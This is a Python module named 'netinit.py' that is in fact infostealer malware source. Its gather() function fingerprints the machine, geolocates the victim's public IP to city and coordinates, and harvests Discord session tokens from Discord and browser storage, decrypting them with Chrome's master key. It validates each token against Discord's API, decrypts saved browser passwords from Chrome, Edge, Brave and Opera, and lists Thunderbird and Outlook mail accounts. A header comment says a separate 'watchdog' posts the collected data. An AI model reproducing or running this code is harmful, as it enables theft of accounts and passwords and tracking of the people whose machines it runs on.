# netinit.py — gathers everything into one dict.
# main.py calls gather(), watchdog posts it.

import base64
import json
import os
import re
import sqlite3
import shutil
import tempfile
import platform
import urllib.request

_L = os.getenv("LOCALAPPDATA", "")
_R = os.getenv("APPDATA", "")
_HOME = os.path.expanduser("~")


# ---------------------------------------------------------------------------
# http helper
# ---------------------------------------------------------------------------
def _get_json(url, timeout=8):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        return json.loads(urllib.request.urlopen(req, timeout=timeout).read().decode())
    except Exception:
        return {}


# ---------------------------------------------------------------------------
# env
# ---------------------------------------------------------------------------
def _env():
    out = {
        "os": platform.platform(),
        "arch": platform.machine(),
        "host": platform.node() or "?",
        "user": os.getenv("USER") or os.getenv("USERNAME") or "?",
        "locale": os.getenv("LANG", "?") or "?",
        "tz": os.getenv("TZ") or "?",
        "cpu": "?",
        "ram": "?",
        "screen": "?",
    }
    try:
        if os.name == "nt":
            out["cpu"] = platform.processor() or "?"
        else:
            with open("/proc/cpuinfo") as f:
                for line in f:
                    if "model name" in line:
                        out["cpu"] = line.split(":", 1)[1].strip()
                        break
    except Exception:
        pass
    try:
        if os.name != "nt":
            with open("/proc/meminfo") as f:
                for line in f:
                    if line.startswith("MemTotal"):
                        out["ram"] = f"{round(int(line.split()[1]) / 1e6)} GB"
                        break
        else:
            import ctypes
            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [
                    ("dwLength", ctypes.c_ulong),
                    ("dwMemoryLoad", ctypes.c_ulong),
                    ("ullTotalPhys", ctypes.c_ulonglong),
                    ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong),
                    ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong),
                    ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
                ]
            m = MEMORYSTATUSEX()
            m.dwLength = ctypes.sizeof(m)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m))
            out["ram"] = f"{round(m.ullTotalPhys / 1e9)} GB"
    except Exception:
        pass
    try:
        if os.name == "nt":
            import ctypes
            u = ctypes.windll.user32
            out["screen"] = f"{u.GetSystemMetrics(0)}x{u.GetSystemMetrics(1)}"
    except Exception:
        pass
    return out


# ---------------------------------------------------------------------------
# ip / geo / vpn
# ---------------------------------------------------------------------------
def _route():
    out = {"ip": "?", "country": "?", "city": "?", "isp": "?", "vpn": "?", "coords": "?"}
    ip = ""
    for src in ("https://api.ipify.org?format=json",
                "https://ipinfo.io/json",
                "https://ifconfig.me/all.json"):
        d = _get_json(src)
        ip = d.get("ip") or d.get("query") or ""
        if ip:
            break
    if not ip:
        return out
    out["ip"] = ip

    geo = _get_json(f"http://ip-api.com/json/{ip}")
    out["country"] = geo.get("country", "?")
    out["city"] = geo.get("city", "?")
    out["isp"] = geo.get("isp", "?")
    lat, lon = geo.get("lat"), geo.get("lon")
    if lat is not None and lon is not None:
        out["coords"] = f"{lat}, {lon}"
    if geo.get("proxy") or geo.get("hosting"):
        out["vpn"] = "possible (proxy/hosting asn)"
    else:
        out["vpn"] = "none detected"
    return out


# ---------------------------------------------------------------------------
# discord tokens
# ---------------------------------------------------------------------------
_SESS_RX = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}")

_TOKEN_DIRS = {
    "Discord":       os.path.join(_R, "discord", "Local Storage", "leveldb"),
    "Canary":        os.path.join(_R, "discordcanary", "Local Storage", "leveldb"),
    "PTB":           os.path.join(_R, "discordptb", "Local Storage", "leveldb"),
    "Chrome":        os.path.join(_L, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
    "Chrome P1":     os.path.join(_L, "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),
    "Edge":          os.path.join(_L, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
    "Brave":         os.path.join(_L, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
    "Opera":         os.path.join(_R, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
    "Opera GX":      os.path.join(_R, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
    "Discord Linux": os.path.join(_HOME, ".config", "discord", "Local Storage", "leveldb"),
    "Chrome Linux":  os.path.join(_HOME, ".config", "google-chrome", "Default", "Local Storage", "leveldb"),
    "Chrome Mac":    os.path.join(_HOME, "Library", "Application Support", "Google", "Chrome", "Default", "Local Storage", "leveldb"),
}


def _master_key(folder):
    try:
        import win32crypt
        state = os.path.join(folder, "..", "..", "Local State")
        with open(state, "r", encoding="utf-8") as f:
            s = json.load(f)
        key = base64.b64decode(s["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception:
        return None


def _decrypt(blob, key):
    try:
        from Crypto.Cipher import AES
        iv, payload = blob[3:15], blob[15:]
        c = AES.new(key, AES.MODE_GCM, iv)
        return c.decrypt(payload)[:-16].decode(errors="ignore")
    except Exception:
        return None


def _scan_tokens(folder):
    found = set()
    if not os.path.isdir(folder):
        return found
    key = _master_key(folder)
    for root, _, files in os.walk(folder):
        for f in files:
            if not (f.endswith(".log") or f.endswith(".ldb")):
                continue
            try:
                text = open(os.path.join(root, f), "rb").read().decode("latin-1", errors="ignore")
            except Exception:
                continue
            for m in _SESS_RX.findall(text):
                found.add(m)
            if key:
                for b64 in re.findall(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)", text):
                    try:
                        d = _decrypt(base64.b64decode(b64), key)
                        if d and _SESS_RX.fullmatch(d):
                            found.add(d)
                    except Exception:
                        continue
    return found


def _whoami(token):
    try:
        req = urllib.request.Request(
            "https://discord.com/api/v9/users/@me",
            headers={"Authorization": token, "User-Agent": "Mozilla/5.0"},
        )
        d = json.loads(urllib.request.urlopen(req, timeout=6).read().decode())
        return f"{d.get('username','?')}#{d.get('discriminator','0')}"
    except Exception:
        return "unverified"


def _tokens():
    out = []
    for name, path in _TOKEN_DIRS.items():
        for tok in _scan_tokens(path):
            out.append(f"{name} | {_whoami(tok)} | {tok}")
    return out


# ---------------------------------------------------------------------------
# browser logins
# ---------------------------------------------------------------------------
def _logins():
    out = []
    candidates = [
        os.path.join(_L, "Google", "Chrome", "User Data", "Default", "Login Data"),
        os.path.join(_L, "Google", "Chrome", "User Data", "Profile 1", "Login Data"),
        os.path.join(_L, "Microsoft", "Edge", "User Data", "Default", "Login Data"),
        os.path.join(_L, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
        os.path.join(_R, "Opera Software", "Opera Stable", "Login Data"),
    ]
    for path in candidates:
        if not os.path.exists(path):
            continue
        try:
            tmp = os.path.join(tempfile.gettempdir(), "l" + str(abs(hash(path))))
            shutil.copyfile(path, tmp)
            con = sqlite3.connect(tmp)
            cur = con.cursor()
            try:
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            except Exception:
                con.close()
                continue
            for origin, user, enc in cur.fetchall():
                if not user:
                    continue
                pw = ""
                if enc:
                    try:
                        import win32crypt
                        pw = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode(errors="ignore")
                    except Exception:
                        pw = "<encrypted>"
                out.append(f"{origin} | {user}:{pw}")
            con.close()
        except Exception:
            continue
    return out


# ---------------------------------------------------------------------------
# mail creds
# ---------------------------------------------------------------------------
def _mails():
    out = []
    try:
        import glob
        for prof in glob.glob(os.path.join(_R, "Thunderbird", "Profiles", "*")):
            logins = os.path.join(prof, "logins.json")
            if not os.path.exists(logins):
                continue
            try:
                data = json.load(open(logins))
                for entry in data.get("logins", []):
                    out.append(f"thunderbird | {entry.get('hostname','?')} | {entry.get('encryptedUsername','')[:40]}")
            except Exception:
                continue
    except Exception:
        pass

    if os.name == "nt":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Office\16.0\Outlook\Profiles")
            i = 0
            while True:
                try:
                    name = winreg.EnumKey(key, i)
                except OSError:
                    break
                out.append(f"outlook | profile | {name}")
                i += 1
        except Exception:
            pass
    return out


# ---------------------------------------------------------------------------
# aggregate — the one function main.py calls
# ---------------------------------------------------------------------------
def gather():
    data = {}
    try:
        data.update(_env())
    except Exception:
        pass
    try:
        data.update(_route())
    except Exception:
        pass
    try:
        data["tokens"] = _tokens()
    except Exception:
        data["tokens"] = []
    try:
        data["logins"] = _logins()
    except Exception:
        data["logins"] = []
    try:
        data["mails"] = _mails()
    except Exception:
        data["mails"] = []
    return data
